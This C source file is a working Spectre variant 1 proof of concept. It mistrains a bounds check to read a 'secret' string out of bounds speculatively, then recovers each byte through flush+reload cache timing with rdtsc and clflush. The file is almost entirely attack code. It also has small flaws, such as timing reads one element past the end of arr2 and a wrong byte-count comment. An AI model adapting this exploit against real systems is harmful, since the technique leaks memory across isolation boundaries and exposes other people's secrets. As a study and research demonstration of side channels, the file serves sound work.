#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <x86intrin.h>
#include <stdint.h>

unsigned int arr1_size = 16;
uint8_t  arr1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t arr2[256 * 512] ;
char * secret = "This is the sensitive data" ;// 18 bytes


static __inline__ unsigned Load(uint8_t *addr){
    volatile unsigned val;
    asm __volatile__(
                  " movl (%1), %%eax \n"
		   : "=a"(val)
		   : "c"(addr)
		   : );
                  //%edx is modified by rdtsc and %esi by our code
    return (val);
}


static __inline__ unsigned LoadAndMeasure(uint8_t *addr){
    volatile unsigned val;
    asm __volatile__(
		  " mfence \n"
		  " rdtsc \n"
		  " lfence \n"
		  " movl %%eax, %%esi \n"
                  " movl (%1), %%eax \n"
		  " lfence \n"
		  " rdtsc \n"
		  " subl %%esi, %%eax"
		   : "=a"(val)
		   : "c"(addr)
		   : "%edx","%esi");
                  //%edx is modified by rdtsc and %esi by our code
    return (val);
    //We return only the lower 32 bits due to relatively low resolution
}



int main(int argc, char ** argv){

  size_t malicious_index = (size_t) (secret - (char*)arr1 ); // the malicious index is the first character in secret (which is T)

  for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1; // write data into arr2 so that no copy on write zero page on RAM

  int hit_time = LoadAndMeasure(&arr2[256*512]); // the last data should in the cache 
  printf("hit time in this machine is %d\n", hit_time);

  _mm_clflush(&arr2[256*512]);
  int miss_time = LoadAndMeasure(&arr2[256*512]);
  printf("misstime in this machine is %d\n", miss_time);
  
  __sync_synchronize();

  size_t training_x ; 
  size_t x;
  int mix_i = 0;
  uint8_t * addr;
  int measured_time;
  static int results[256];
  int threshold = hit_time + 20 ;

  for (int tries = 50; tries > 0; tries--){

    for (int i = 0; i < 256; i++) _mm_clflush(&arr2[i * 512]); // flush all the cache line 

    training_x = tries % arr1_size;

    for ( int t = 29;  t >= 0; t--) {
      _mm_clflush( & arr1_size); 

      for (volatile int z = 0; z < 100; z++) {} // delay

      x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_index ^ training_x)); // x = tranning_x for normal behaviour when previous x = 0, x = malicious_index when previous x = -1 

      /********** Victim **************/
      if (x < arr1_size){
        Load(&arr2[arr1[x] * 512]);
      }
      /********** Victim **************/
    }
    
    for (int i = 0; i < 256; i++){
      mix_i = ((i * 167) + 13) & 255; 
      addr = & arr2[mix_i * 512];
      measured_time = LoadAndMeasure(addr);
      
      if (measured_time <= threshold && mix_i != arr1[training_x]){ // arr1[training_x] will also loaded in cache for fool predictor
        results[mix_i]++; // hit one time
      }

    }
  }


  for (int m = 0; m < 255; m++){
    if (results[m] != 0){
      printf("guessed ASCII decimal is %d, corresponding char is %c, cache hit time is %d over total 50 times\n", m, (uint8_t)m , results[m] );
    } 
  }

  return 0;

}